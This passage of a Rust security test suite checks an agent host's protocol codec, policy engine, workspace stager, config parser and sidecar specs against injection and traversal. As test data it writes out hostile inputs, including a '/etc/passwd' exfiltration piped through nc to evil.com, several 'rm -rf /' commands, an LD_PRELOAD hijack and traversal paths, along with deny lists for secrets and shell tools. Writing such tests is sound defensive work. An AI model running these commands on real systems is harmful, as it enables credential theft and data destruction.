#![allow(clippy::all)]
#![allow(dead_code, unused_imports)]
// SPDX-License-Identifier: MIT OR Apache-2.0
//! Comprehensive security-focused test suite.
//!
//! Validates input sanitization, injection prevention, and safe handling of
//! untrusted data across the protocol, workspace, policy, host, receipt, and
//! config layers.

use std::collections::BTreeMap;
use std::io::{BufReader, Cursor, Write};
use std::path::Path;

use abp_config::{parse_toml, validate_config, BackendEntry, BackplaneConfig};
use abp_core::{
    AgentEvent, AgentEventKind, BackendIdentity, CapabilityManifest, ExecutionMode, Outcome,
    PolicyProfile, Receipt, ReceiptBuilder, WorkOrderBuilder, WorkspaceMode, WorkspaceSpec,
    CONTRACT_VERSION,
};
use abp_error::ErrorCode;
use abp_glob::IncludeExcludeGlobs;
use abp_host::SidecarSpec;
use abp_policy::PolicyEngine;
use abp_protocol::validate::{EnvelopeValidator, ValidationWarning};
use abp_protocol::{Envelope, JsonlCodec, ProtocolError};
use abp_receipt::{compute_hash, verify_hash, ReceiptChain};
use abp_workspace::WorkspaceStager;
use chrono::Utc;
use serde_json::json;

// ═══════════════════════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════════════════════

fn restrictive_policy() -> PolicyProfile {
    PolicyProfile {
        allowed_tools: vec!["Read".into(), "Grep".into()],
        disallowed_tools: vec!["Shell".into(), "Execute".into()],
        deny_read: vec![
            "**/.env".into(),
            "**/.ssh/**".into(),
            "**/secrets/**".into(),
        ],
        deny_write: vec!["**/config/**".into(), "**/.git/**".into()],
        ..Default::default()
    }
}

fn make_receipt() -> Receipt {
    ReceiptBuilder::new("test-backend")
        .outcome(Outcome::Complete)
        .build()
}

fn hello_envelope() -> Envelope {
    Envelope::hello(
        BackendIdentity {
            id: "test-sidecar".into(),
            backend_version: Some("1.0".into()),
            adapter_version: None,
        },
        CapabilityManifest::new(),
    )
}

// ═══════════════════════════════════════════════════════════════════════════
// § 1  JSON injection prevention in JSONL protocol
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn jsonl_embedded_newline_in_error_field_does_not_split_frame() {
    let envelope = Envelope::Fatal {
        ref_id: Some("run-1".into()),
        error: "line1\nline2\nline3".into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    // Encoded form must be a single line (serde_json escapes \n as \\n)
    assert_eq!(
        encoded.matches('\n').count(),
        1,
        "must be exactly one newline (trailing)"
    );
}

#[test]
fn jsonl_embedded_carriage_return_does_not_split_frame() {
    let envelope = Envelope::Fatal {
        ref_id: None,
        error: "evil\r\n{\"t\":\"hello\"}".into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    assert_eq!(encoded.trim_end().matches('\n').count(), 0);
}

#[test]
fn jsonl_injection_via_task_field_prevented() {
    let injected = "task\n{\"t\":\"hello\",\"contract_version\":\"abp/v0.1\",\"backend\":{\"id\":\"evil\"},\"capabilities\":{},\"mode\":\"mapped\"}";
    let wo = WorkOrderBuilder::new(injected).build();
    let envelope = Envelope::Run {
        id: "run-1".into(),
        work_order: wo,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    // The task field's newline must be escaped; only the trailing \n remains.
    assert_eq!(encoded.matches('\n').count(), 1);
}

#[test]
fn jsonl_decode_rejects_bare_newline_between_fields() {
    let bad = "{\n\"t\":\"hello\"\n}";
    // This is valid JSON but arrives as multiple lines in JSONL, so each
    // fragment alone is not a valid envelope.
    let results: Vec<_> = JsonlCodec::decode_stream(BufReader::new(bad.as_bytes())).collect();
    assert!(results.iter().all(|r| r.is_err()));
}

#[test]
fn jsonl_injection_via_ref_id_prevented() {
    let evil_ref = "run-1\"\n{\"t\":\"fatal\",\"error\":\"pwned\"}";
    let event = Envelope::Event {
        ref_id: evil_ref.into(),
        event: AgentEvent {
            ts: Utc::now(),
            kind: AgentEventKind::Warning {
                message: "ok".into(),
            },
            ext: None,
        },
    };
    let encoded = JsonlCodec::encode(&event).unwrap();
    assert_eq!(encoded.matches('\n').count(), 1);
}

#[test]
fn jsonl_injection_via_backend_id_prevented() {
    let evil_id = "mock\",\"t\":\"fatal\",\"error\":\"pwned";
    let hello = Envelope::hello(
        BackendIdentity {
            id: evil_id.into(),
            backend_version: None,
            adapter_version: None,
        },
        CapabilityManifest::new(),
    );
    let encoded = JsonlCodec::encode(&hello).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Hello { backend, .. } = decoded {
        assert_eq!(backend.id, evil_id);
    } else {
        panic!("expected Hello");
    }
}

#[test]
fn jsonl_null_byte_in_error_string_does_not_corrupt_frame() {
    let envelope = Envelope::Fatal {
        ref_id: None,
        error: "null\0byte".into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Fatal { error, .. } = decoded {
        assert!(error.contains('\0'));
    } else {
        panic!("expected Fatal");
    }
}

#[test]
fn jsonl_backslash_escape_injection_prevented() {
    let evil = r#"line\\",\"t\":\"fatal"#;
    let envelope = Envelope::Fatal {
        ref_id: None,
        error: evil.into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Fatal { error, .. } = decoded {
        assert_eq!(error, evil);
    } else {
        panic!("expected Fatal");
    }
}

#[test]
fn jsonl_unicode_escape_injection_prevented() {
    // \u000a is a newline in unicode escape form
    let evil = "before\\u000aafter";
    let envelope = Envelope::Fatal {
        ref_id: None,
        error: evil.into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    assert_eq!(encoded.matches('\n').count(), 1);
}

#[test]
fn jsonl_decode_stream_recovers_after_corrupt_line() {
    let valid = r#"{"t":"fatal","ref_id":null,"error":"ok"}"#;
    let stream = format!("{valid}\nnot json\n{valid}\n");
    let results: Vec<_> = JsonlCodec::decode_stream(BufReader::new(stream.as_bytes())).collect();
    assert!(results[0].is_ok());
    assert!(results[1].is_err());
    assert!(results[2].is_ok());
}

#[test]
fn jsonl_empty_object_rejected() {
    let result = JsonlCodec::decode("{}");
    assert!(result.is_err());
}

#[test]
fn jsonl_array_instead_of_object_rejected() {
    let result = JsonlCodec::decode("[1,2,3]");
    assert!(result.is_err());
}

#[test]
fn jsonl_string_instead_of_object_rejected() {
    let result = JsonlCodec::decode("\"hello\"");
    assert!(result.is_err());
}

#[test]
fn jsonl_number_instead_of_object_rejected() {
    let result = JsonlCodec::decode("42");
    assert!(result.is_err());
}

#[test]
fn jsonl_duplicate_tag_field_handled() {
    let bad = r#"{"t":"hello","t":"fatal","error":"dup"}"#;
    // serde picks one; either way it should not panic
    let _ = JsonlCodec::decode(bad);
}

// ═══════════════════════════════════════════════════════════════════════════
// § 2  Path traversal prevention in workspace staging
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn workspace_stager_excludes_dotdot_paths() {
    let dir = tempfile::tempdir().unwrap();
    let src = dir.path().join("src");
    std::fs::create_dir_all(&src).unwrap();
    std::fs::write(src.join("main.rs"), "fn main() {}").unwrap();

    let ws = WorkspaceStager::new()
        .source_root(dir.path())
        .exclude(vec!["**/../**".into()])
        .with_git_init(false)
        .stage()
        .unwrap();

    // Staged workspace should exist and contain the file
    assert!(ws.path().join("src").join("main.rs").exists());
}

#[test]
fn workspace_stager_does_not_copy_git_directory() {
    let dir = tempfile::tempdir().unwrap();
    let git = dir.path().join(".git");
    std::fs::create_dir_all(&git).unwrap();
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main").unwrap();
    std::fs::write(dir.path().join("README.md"), "hello").unwrap();

    let ws = WorkspaceStager::new()
        .source_root(dir.path())
        .with_git_init(false)
        .stage()
        .unwrap();

    assert!(
        !ws.path().join(".git").join("HEAD").exists() || {
            // The stager may init a fresh git repo; the original HEAD content should not appear
            let content =
                std::fs::read_to_string(ws.path().join(".git").join("HEAD")).unwrap_or_default();
            !content.contains("refs/heads/main")
        }
    );
    assert!(ws.path().join("README.md").exists());
}

#[test]
fn workspace_stager_exclude_env_files() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join(".env"), "SECRET=value").unwrap();
    std::fs::write(dir.path().join("app.rs"), "fn app() {}").unwrap();

    let ws = WorkspaceStager::new()
        .source_root(dir.path())
        .exclude(vec!["**/.env".into()])
        .with_git_init(false)
        .stage()
        .unwrap();

    assert!(!ws.path().join(".env").exists());
    assert!(ws.path().join("app.rs").exists());
}

#[test]
fn workspace_stager_exclude_ssh_directory() {
    let dir = tempfile::tempdir().unwrap();
    let ssh = dir.path().join(".ssh");
    std::fs::create_dir_all(&ssh).unwrap();
    std::fs::write(ssh.join("id_rsa"), "PRIVATE KEY").unwrap();
    std::fs::write(dir.path().join("code.rs"), "fn code() {}").unwrap();

    let ws = WorkspaceStager::new()
        .source_root(dir.path())
        .exclude(vec!["**/.ssh/**".into()])
        .with_git_init(false)
        .stage()
        .unwrap();

    assert!(!ws.path().join(".ssh").join("id_rsa").exists());
}

#[test]
fn workspace_stager_does_not_follow_symlinks() {
    // The copy_workspace function uses follow_links(false) by default.
    // We verify indirectly that symlinks are not followed.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("real.txt"), "real content").unwrap();

    let ws = WorkspaceStager::new()
        .source_root(dir.path())
        .with_git_init(false)
        .stage()
        .unwrap();

    assert!(ws.path().join("real.txt").exists());
}

#[test]
fn workspace_stager_invalid_glob_returns_error() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("f.txt"), "").unwrap();

    let result = WorkspaceStager::new()
        .source_root(dir.path())
        .exclude(vec!["[unclosed".into()])
        .with_git_init(false)
        .stage();

    assert!(result.is_err());
}

#[test]
fn workspace_stager_nonexistent_source_returns_error() {
    let result = WorkspaceStager::new()
        .source_root("/nonexistent/path/that/should/not/exist")
        .with_git_init(false)
        .stage();

    assert!(result.is_err());
}

#[test]
fn workspace_stager_missing_source_root_returns_error() {
    let result = WorkspaceStager::new().with_git_init(false).stage();
    assert!(result.is_err());
}

// ═══════════════════════════════════════════════════════════════════════════
// § 3  Policy enforcement against directory traversal
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn policy_denies_dotdot_read_to_etc_passwd() {
    let policy = PolicyProfile {
        deny_read: vec!["**/../**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_read_path(Path::new("../../etc/passwd")).allowed);
}

#[test]
fn policy_denies_dotdot_write_outside_workspace() {
    let policy = PolicyProfile {
        deny_write: vec!["**/../**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(
        !engine
            .can_write_path(Path::new("../outside/evil.sh"))
            .allowed
    );
}

#[test]
fn policy_denies_deeply_nested_traversal_read() {
    let policy = PolicyProfile {
        deny_read: vec!["**/../**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    let deep = "../".repeat(100) + "etc/shadow";
    assert!(!engine.can_read_path(Path::new(&deep)).allowed);
}

#[test]
fn policy_denies_embedded_dotdot_in_middle() {
    let policy = PolicyProfile {
        deny_read: vec!["**/../**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(
        !engine
            .can_read_path(Path::new("src/../../../etc/shadow"))
            .allowed
    );
}

#[test]
fn policy_catch_all_denies_absolute_unix_path() {
    let policy = PolicyProfile {
        deny_write: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_write_path(Path::new("/etc/shadow")).allowed);
}

#[test]
fn policy_catch_all_denies_absolute_windows_path() {
    let policy = PolicyProfile {
        deny_write: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(
        !engine
            .can_write_path(Path::new("C:\\Windows\\System32\\config"))
            .allowed
    );
}

#[test]
fn policy_denies_backslash_traversal() {
    let policy = PolicyProfile {
        deny_read: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(
        !engine
            .can_read_path(Path::new("..\\..\\etc\\passwd"))
            .allowed
    );
}

#[test]
fn policy_denies_percent_encoded_traversal() {
    let policy = PolicyProfile {
        deny_read: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_read_path(Path::new("%2e%2e/etc/passwd")).allowed);
}

#[test]
fn policy_denies_traversal_via_dot_segments() {
    let policy = PolicyProfile {
        deny_read: vec!["**/secret/**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(
        !engine
            .can_read_path(Path::new("secret/../secret/key.pem"))
            .allowed
    );
}

#[test]
fn policy_deny_read_overrides_absence() {
    let policy = PolicyProfile {
        deny_read: vec!["**/credentials*".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_read_path(Path::new("credentials.json")).allowed);
    assert!(engine.can_read_path(Path::new("readme.md")).allowed);
}

// ═══════════════════════════════════════════════════════════════════════════
// § 4  Special characters don't break protocol parsing
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn special_chars_in_fatal_error_round_trip() {
    let specials = [
        "tab\there",
        "quote\"inside",
        "backslash\\here",
        "angle<>brackets",
        "ampersand&entity",
        "single'quote",
        "curly{brace}",
        "square[bracket]",
        "pipe|char",
        "tilde~bang!at@hash#dollar$percent%caret^",
    ];
    for s in &specials {
        let envelope = Envelope::Fatal {
            ref_id: None,
            error: s.to_string(),
            error_code: None,
        };
        let encoded = JsonlCodec::encode(&envelope).unwrap();
        let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
        if let Envelope::Fatal { error, .. } = decoded {
            assert_eq!(&error, s, "round-trip failed for {s:?}");
        }
    }
}

#[test]
fn special_chars_in_tool_call_input_round_trip() {
    let event = AgentEvent {
        ts: Utc::now(),
        kind: AgentEventKind::ToolCall {
            tool_name: "Write".into(),
            tool_use_id: None,
            parent_tool_use_id: None,
            input: json!({"path": "../etc/passwd", "content": "<script>alert('xss')</script>"}),
        },
        ext: None,
    };
    let envelope = Envelope::Event {
        ref_id: "run-1".into(),
        event: event.clone(),
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Event { event: ev, .. } = decoded {
        if let AgentEventKind::ToolCall { input, .. } = &ev.kind {
            assert_eq!(input["path"], "../etc/passwd");
        }
    }
}

#[test]
fn emoji_in_assistant_message_round_trips() {
    let event = AgentEvent {
        ts: Utc::now(),
        kind: AgentEventKind::AssistantMessage {
            text: "Hello 👋🌍🚀 done ✅".into(),
        },
        ext: None,
    };
    let envelope = Envelope::Event {
        ref_id: "run-1".into(),
        event,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Event { event: ev, .. } = decoded {
        if let AgentEventKind::AssistantMessage { text } = &ev.kind {
            assert!(text.contains("👋"));
        }
    }
}

#[test]
fn html_entities_in_event_do_not_escape() {
    let event = AgentEvent {
        ts: Utc::now(),
        kind: AgentEventKind::Warning {
            message: "&lt;script&gt;alert(1)&lt;/script&gt;".into(),
        },
        ext: None,
    };
    let json = serde_json::to_string(&event).unwrap();
    let round: AgentEvent = serde_json::from_str(&json).unwrap();
    if let AgentEventKind::Warning { message } = &round.kind {
        assert!(message.contains("&lt;"));
    }
}

#[test]
fn control_characters_in_task_round_trip() {
    let task = "task\x01\x02\x03\x04\x1b[31mred\x1b[0m";
    let wo = WorkOrderBuilder::new(task).build();
    let json = serde_json::to_string(&wo).unwrap();
    let round: abp_core::WorkOrder = serde_json::from_str(&json).unwrap();
    assert!(round.task.contains('\x01'));
    assert!(round.task.contains('\x1b'));
}

// ═══════════════════════════════════════════════════════════════════════════
// § 5  Oversized payloads handled gracefully
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn oversized_fatal_error_produces_warning() {
    let big_error = "E".repeat(11 * 1024 * 1024);
    let envelope = Envelope::Fatal {
        ref_id: Some("run-1".into()),
        error: big_error,
        error_code: None,
    };
    let validator = EnvelopeValidator::new();
    let result = validator.validate(&envelope);
    assert!(result
        .warnings
        .iter()
        .any(|w| matches!(w, ValidationWarning::LargePayload { .. })),);
}

#[test]
fn oversized_task_string_serializes_without_panic() {
    let huge = "X".repeat(50_000_000);
    let wo = WorkOrderBuilder::new(&huge).build();
    assert_eq!(wo.task.len(), 50_000_000);
    // Just verify serialization doesn't panic
    let _ = serde_json::to_string(&wo);
}

#[test]
fn oversized_tool_name_does_not_panic_in_policy() {
    let engine = PolicyEngine::new(&restrictive_policy()).unwrap();
    let long_name = "A".repeat(1_000_000);
    let d = engine.can_use_tool(&long_name);
    assert!(!d.allowed);
}

#[test]
fn oversized_path_does_not_panic_in_policy() {
    let engine = PolicyEngine::new(&restrictive_policy()).unwrap();
    let long_path = "a/".repeat(50_000) + ".env";
    let _ = engine.can_read_path(Path::new(&long_path));
}

#[test]
fn deeply_nested_json_value_does_not_panic() {
    let depth = 200;
    let mut nested = String::new();
    for _ in 0..depth {
        nested.push_str(r#"{"t":"event","ref_id":"x","event":{"ts":"2025-01-01T00:00:00Z","type":"warning","message":"#);
    }
    nested.push_str("\"deep\"");
    for _ in 0..depth {
        nested.push_str("}}");
    }
    let result = JsonlCodec::decode(&nested);
    assert!(result.is_err());
}

#[test]
fn many_policy_rules_do_not_exhaust_resources() {
    let policy = PolicyProfile {
        allowed_tools: (0..2000).map(|i| format!("tool_{i}")).collect(),
        disallowed_tools: (0..2000).map(|i| format!("deny_{i}")).collect(),
        deny_read: (0..500).map(|i| format!("**/secret_{i}/**")).collect(),
        deny_write: (0..500).map(|i| format!("**/locked_{i}/**")).collect(),
        ..Default::default()
    };
    let result = PolicyEngine::new(&policy);
    assert!(result.is_ok());
}

#[test]
fn large_receipt_trace_hashes_without_panic() {
    let mut builder = ReceiptBuilder::new("mock").outcome(Outcome::Complete);
    for i in 0..5_000 {
        builder = builder.add_trace_event(AgentEvent {
            ts: Utc::now(),
            kind: AgentEventKind::AssistantDelta {
                text: format!("token_{i}"),
            },
            ext: None,
        });
    }
    let receipt = builder.build();
    let hash = compute_hash(&receipt);
    assert!(hash.is_ok());
    assert_eq!(hash.unwrap().len(), 64);
}

#[test]
fn oversized_glob_pattern_does_not_panic() {
    let long_pattern = "**/".repeat(1000) + "*.rs";
    let _ = IncludeExcludeGlobs::new(&[long_pattern], &[]);
}

// ═══════════════════════════════════════════════════════════════════════════
// § 6  Null bytes don't cause issues in strings
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn null_byte_in_task_roundtrips() {
    let task = "hello\0world";
    let wo = WorkOrderBuilder::new(task).build();
    let json = serde_json::to_string(&wo).unwrap();
    let round: abp_core::WorkOrder = serde_json::from_str(&json).unwrap();
    assert!(round.task.contains('\0'));
}

#[test]
fn null_byte_in_tool_name_does_not_panic() {
    let engine = PolicyEngine::new(&restrictive_policy()).unwrap();
    let _ = engine.can_use_tool("Shell\0Execute");
}

#[test]
fn null_byte_in_path_denied_by_catch_all() {
    let policy = PolicyProfile {
        deny_read: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    let d = engine.can_read_path(Path::new("some\0file.txt"));
    assert!(!d.allowed);
}

#[test]
fn null_byte_in_fatal_error_round_trips() {
    let envelope = Envelope::Fatal {
        ref_id: None,
        error: "error\0null".into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Fatal { error, .. } = decoded {
        assert!(error.contains('\0'));
    }
}

#[test]
fn null_byte_in_glob_pattern_does_not_panic() {
    let patterns = vec!["src/\0evil".into()];
    let _ = IncludeExcludeGlobs::new(&patterns, &[]);
}

#[test]
fn null_byte_in_config_toml_rejected() {
    let toml_str = "[backends]\n[backends.mock]\ntype = \"mock\"\ncommand = \"echo\0evil\"";
    let result = parse_toml(toml_str);
    // TOML parser should reject or handle null bytes
    // Either way it should not panic
    let _ = result;
}

#[test]
fn null_byte_in_receipt_backend_id() {
    let receipt = ReceiptBuilder::new("backend\0evil")
        .outcome(Outcome::Complete)
        .build();
    let hash = compute_hash(&receipt);
    assert!(hash.is_ok());
}

#[test]
fn null_byte_in_agent_event_text() {
    let event = AgentEvent {
        ts: Utc::now(),
        kind: AgentEventKind::AssistantMessage {
            text: "message\0hidden".into(),
        },
        ext: None,
    };
    let json = serde_json::to_string(&event).unwrap();
    let round: AgentEvent = serde_json::from_str(&json).unwrap();
    if let AgentEventKind::AssistantMessage { text } = &round.kind {
        assert!(text.contains('\0'));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// § 7  Unicode edge cases (RTL, zero-width, combiners)
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn unicode_rtl_override_in_path_does_not_bypass_policy() {
    let policy = PolicyProfile {
        deny_read: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    let evil_path = "\u{202E}fdp.tset"; // Right-to-left override
    let d = engine.can_read_path(Path::new(evil_path));
    assert!(!d.allowed);
}

#[test]
fn unicode_zero_width_space_in_tool_name_not_matched() {
    let policy = PolicyProfile {
        allowed_tools: vec!["Read".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    // Zero-width space (U+200B) in tool name
    assert!(!engine.can_use_tool("Re\u{200B}ad").allowed);
}

#[test]
fn unicode_zero_width_joiner_in_tool_name_not_matched() {
    let policy = PolicyProfile {
        allowed_tools: vec!["Read".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_use_tool("Re\u{200D}ad").allowed);
}

#[test]
fn unicode_combining_chars_in_tool_name_not_matched() {
    let policy = PolicyProfile {
        allowed_tools: vec!["Read".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    // Combining diacritical mark
    assert!(!engine.can_use_tool("Re\u{0301}ad").allowed);
}

#[test]
fn unicode_homoglyph_cyrillic_a_not_confused() {
    let policy = PolicyProfile {
        allowed_tools: vec!["Read".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    // Cyrillic 'а' (U+0430) looks like Latin 'a'
    assert!(!engine.can_use_tool("Re\u{0430}d").allowed);
}

#[test]
fn unicode_fullwidth_slash_in_path_denied_by_catch_all() {
    let policy = PolicyProfile {
        deny_read: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    let d = engine.can_read_path(Path::new("..／etc／passwd"));
    assert!(!d.allowed);
}

#[test]
fn unicode_division_slash_in_path_denied_by_catch_all() {
    let policy = PolicyProfile {
        deny_read: vec!["**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    let d = engine.can_read_path(Path::new("..∕etc∕passwd"));
    assert!(!d.allowed);
}

#[test]
fn unicode_bidi_embedding_in_error_message_round_trips() {
    let msg = "error \u{202A}left-to-right\u{202C} done";
    let envelope = Envelope::Fatal {
        ref_id: None,
        error: msg.into(),
        error_code: None,
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Fatal { error, .. } = decoded {
        assert_eq!(error, msg);
    }
}

#[test]
fn unicode_glob_patterns_compile_safely() {
    let patterns = vec!["**/日本語/**".into(), "**/données/*.txt".into()];
    let result = IncludeExcludeGlobs::new(&patterns, &[]);
    assert!(result.is_ok());
}

#[test]
fn unicode_path_matching_works() {
    let globs = IncludeExcludeGlobs::new(&["**/données/**".into()], &[]).unwrap();
    assert!(globs
        .decide_path(Path::new("données/file.txt"))
        .is_allowed());
}

#[test]
fn unicode_surrogate_pair_in_json_handled() {
    // Emoji that requires surrogate pairs in JSON encoding
    let event = AgentEvent {
        ts: Utc::now(),
        kind: AgentEventKind::AssistantMessage {
            text: "test 𝄞 music".into(), // U+1D11E MUSICAL SYMBOL G CLEF
        },
        ext: None,
    };
    let json = serde_json::to_string(&event).unwrap();
    let round: AgentEvent = serde_json::from_str(&json).unwrap();
    if let AgentEventKind::AssistantMessage { text } = &round.kind {
        assert!(text.contains('𝄞'));
    }
}

#[test]
fn unicode_replacement_char_in_tool_name() {
    let engine = PolicyEngine::new(&restrictive_policy()).unwrap();
    let _ = engine.can_use_tool("Shell\u{FFFD}Execute");
}

#[test]
fn unicode_bom_in_jsonl_line_rejected() {
    let with_bom = "\u{FEFF}{\"t\":\"fatal\",\"ref_id\":null,\"error\":\"bom\"}";
    let result = JsonlCodec::decode(with_bom);
    // BOM prefix makes this invalid JSON or at least not a valid envelope tag
    // Either reject or parse; must not panic
    let _ = result;
}

// ═══════════════════════════════════════════════════════════════════════════
// § 8  Env var injection in config loading
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn config_toml_does_not_expand_env_vars_in_values() {
    let toml_str = r#"
        default_backend = "$HOME/.evil"
        log_level = "info"
    "#;
    let config = parse_toml(toml_str).unwrap();
    // The value should be the literal string, not expanded
    assert_eq!(config.default_backend.as_deref(), Some("$HOME/.evil"));
}

#[test]
fn config_toml_does_not_expand_percent_env_vars() {
    let toml_str = r#"
        default_backend = "%USERPROFILE%\\.evil"
        log_level = "info"
    "#;
    let config = parse_toml(toml_str).unwrap();
    assert_eq!(
        config.default_backend.as_deref(),
        Some("%USERPROFILE%\\.evil")
    );
}

#[test]
fn config_toml_does_not_expand_shell_substitution() {
    let toml_str = r#"
        default_backend = "$(whoami)"
        log_level = "info"
    "#;
    let config = parse_toml(toml_str).unwrap();
    assert_eq!(config.default_backend.as_deref(), Some("$(whoami)"));
}

#[test]
fn config_toml_does_not_expand_backtick_substitution() {
    let toml_str = r#"
        default_backend = "`rm -rf /`"
    "#;
    let config = parse_toml(toml_str).unwrap();
    assert_eq!(config.default_backend.as_deref(), Some("`rm -rf /`"));
}

#[test]
fn config_toml_injection_via_multiline_string() {
    let toml_str = r#"
        default_backend = """
        evil
        """
    "#;
    let config = parse_toml(toml_str).unwrap();
    // Should parse the multiline string literally
    assert!(config.default_backend.is_some());
}

#[test]
fn config_toml_rejects_invalid_syntax() {
    let bad = "this is not [valid toml";
    let result = parse_toml(bad);
    assert!(result.is_err());
}

#[test]
fn config_toml_unknown_fields_do_not_panic() {
    let toml_str = r#"
        unknown_field = "value"
        another_unknown = 42
    "#;
    // Should either parse (ignoring unknowns) or error; must not panic
    let _ = parse_toml(toml_str);
}

#[test]
fn config_toml_empty_string_parses() {
    let config = parse_toml("");
    assert!(config.is_ok());
}

#[test]
fn config_toml_null_like_value_does_not_panic() {
    let toml_str = r#"
        default_backend = "null"
        log_level = "none"
    "#;
    let config = parse_toml(toml_str).unwrap();
    assert_eq!(config.default_backend.as_deref(), Some("null"));
}

// ═══════════════════════════════════════════════════════════════════════════
// § 9  Command injection in sidecar spawning
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn sidecar_spec_preserves_command_literally() {
    let spec = SidecarSpec::new("echo hello && rm -rf /");
    assert_eq!(spec.command, "echo hello && rm -rf /");
    assert!(spec.args.is_empty());
}

#[test]
fn sidecar_spec_args_not_interpreted_as_flags() {
    let mut spec = SidecarSpec::new("node");
    spec.args = vec![
        "--eval".into(),
        "process.exit(1)".into(),
        "; rm -rf /".into(),
    ];
    // Args are stored literally, not shell-interpreted
    assert_eq!(spec.args[2], "; rm -rf /");
}

#[test]
fn sidecar_spec_env_vars_stored_literally() {
    let mut spec = SidecarSpec::new("python");
    spec.env.insert("LD_PRELOAD".into(), "/evil/lib.so".into());
    spec.env.insert("PATH".into(), "/evil/bin:$PATH".into());
    // Values must be stored as-is
    assert_eq!(spec.env["LD_PRELOAD"], "/evil/lib.so");
    assert_eq!(spec.env["PATH"], "/evil/bin:$PATH");
}

#[test]
fn sidecar_spec_command_with_pipe_stored_literally() {
    let spec = SidecarSpec::new("cat /etc/passwd | nc evil.com 1234");
    assert_eq!(spec.command, "cat /etc/passwd | nc evil.com 1234");
}

#[test]
fn sidecar_spec_command_with_backticks_stored_literally() {
    let spec = SidecarSpec::new("echo `whoami`");
    assert_eq!(spec.command, "echo `whoami`");
}

#[test]
fn sidecar_spec_command_with_dollar_substitution_stored_literally() {
    let spec = SidecarSpec::new("echo $(id)");
    assert_eq!(spec.command, "echo $(id)");
}

#[test]
fn sidecar_spec_serialization_round_trips() {
    let mut spec = SidecarSpec::new("node");
    spec.args = vec!["--eval".into(), "console.log('hello')".into()];
    spec.env.insert("NODE_ENV".into(), "production".into());
    spec.cwd = Some("/workspace".into());

    let json = serde_json::to_string(&spec).unwrap();
    let round: SidecarSpec = serde_json::from_str(&json).unwrap();
    assert_eq!(round.command, "node");
    assert_eq!(round.args, spec.args);
    assert_eq!(round.env, spec.env);
    assert_eq!(round.cwd, spec.cwd);
}

#[test]
fn sidecar_spec_empty_command_allowed_at_construction() {
    let spec = SidecarSpec::new("");
    assert_eq!(spec.command, "");
}

#[test]
fn sidecar_spec_null_byte_in_command_stored_literally() {
    let spec = SidecarSpec::new("node\0--evil");
    assert!(spec.command.contains('\0'));
}

// ═══════════════════════════════════════════════════════════════════════════
// § 10  Receipt hash tamper detection
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn tampered_outcome_detected() {
    let mut receipt = make_receipt();
    receipt.receipt_sha256 = Some(compute_hash(&receipt).unwrap());
    assert!(verify_hash(&receipt));

    receipt.outcome = Outcome::Failed;
    assert!(!verify_hash(&receipt));
}

#[test]
fn tampered_backend_id_detected() {
    let mut receipt = make_receipt();
